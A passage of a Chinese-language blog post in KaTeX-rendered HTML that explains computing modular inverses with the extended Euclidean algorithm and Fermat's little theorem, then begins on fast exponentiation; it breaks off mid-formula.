mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.25em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></p><p>即可得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">r_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>由<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>的线性组合表示。</p><p>下面给出扩展欧几里得算法的应用举例：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240623180432893.png" alt="image-20240623180432893" style="zoom:50%;" /><p>稍作变换，当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\gcd(a,m)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>时，应用扩展欧几里得定理，最后得到：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>=</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>m</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">1=ax+my</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></p><p>两边同时模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>m</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ax\bmod m=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>即此时的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">a^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，即所求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span>的逆元。</p><p>为了加深印象，再给出一个应用扩展欧几里得算法求逆元的例子：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240623180927143.png" alt="image-20240623180927143" style="zoom:50%;" /><p>可以看到，大致的流程就是先正向应用一遍欧几里得算法，然后再依次把每个式子的余数倒着代回原式，最后就可以逆推得到关于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">\gcd(a,b)=ax+by</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>的式子，解出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x,y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>。</p><h2 id="费马小定理"><a class="markdownIt-Anchor" href="#费马小定理"></a> 费马小定理</h2><p>可以看到运用扩展欧几里得定理虽然效率较高，但是仍然要先应用一遍正向的欧几里得算法再反推回去，稍显麻烦。在某些时候我们可以用费马小定理来提升计算效率。</p><p>费马小定理对素数模数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>特别有用。具体来说，如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>互质（即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\gcd(a,p)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>），那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mn>1</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{p-1}\equiv 1\bmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>。因此逆元可以表示为：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>2</mn></mrow></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{-1}\equiv a^{p-2}\bmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span></p><p>对于大数的幂运算，通常还使用快速幂算法来进一步提高效率。</p><h3 id="快速幂算法"><a class="markdownIt-Anchor" href="#快速幂算法"></a> 快速幂算法</h3><p>假设我们要求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span>模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>的逆元，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>是素数。则我们需要求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>2</mn></mrow></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{p-2}\bmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>。</p><p>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>特别大时，计算幂的操作将会变得复杂。我们引入了快速幂算法，他能将朴素的计算幂时间复杂度从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><p>假设我们需要计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>b</mi></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^b\bmod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>。首先可以把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>表示为二进制的形式。例如，若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mn>13</mn></mrow><annotation encoding="application/x-tex">b=13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">3</span></span></span></span>，则其二进制表示为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>110</mn><msub><mn>1</mn><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">1101_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。根据二进制表示，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>13</mn></mrow><annotation encoding="application/x-tex">13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">3</span></span></span></span>可以表示为：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>13</mn><mo>=</mo><mn>1</mn><mo separator="true">⋅</mo><msup><mn>2</mn><mn>3</mn></msup><mo>+</mo><mn>1</mn><mo separator="true">⋅</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><mn>0</mn><mo separator="true">⋅</mo><msup><mn>2</mn><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo separator="true">⋅</mo><msup><mn>2</mn><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">13=1·2^3+1·2^2+0·2^1+1·2^0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></p><p>因此：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mn>13</mn></msup><mo>=</mo><msup><mi>a</mi><mrow><msup><mn>2</mn><mn>3</mn></msup><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><msup><mn>2</mn><mn>0</mn></msup></mrow></msup><mo>=</mo><msup><mi>a</mi><msup><mn>2</mn><mn>3</mn></msup></msup><mo separator="true">⋅</mo><msup><mi>a</mi><msup><mn>2</mn><mn>2</mn></msup></msup><mo separator="true">⋅</mo><msup><mi>a</mi><msup><mn>2</mn><mn>0</mn></msup></msup></mrow><annotation encoding="application/x-tex">a^{13}=a^{2^{3}+2^2+2^0}=a^{2^3}·a^{2^2}·a^{2^0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span 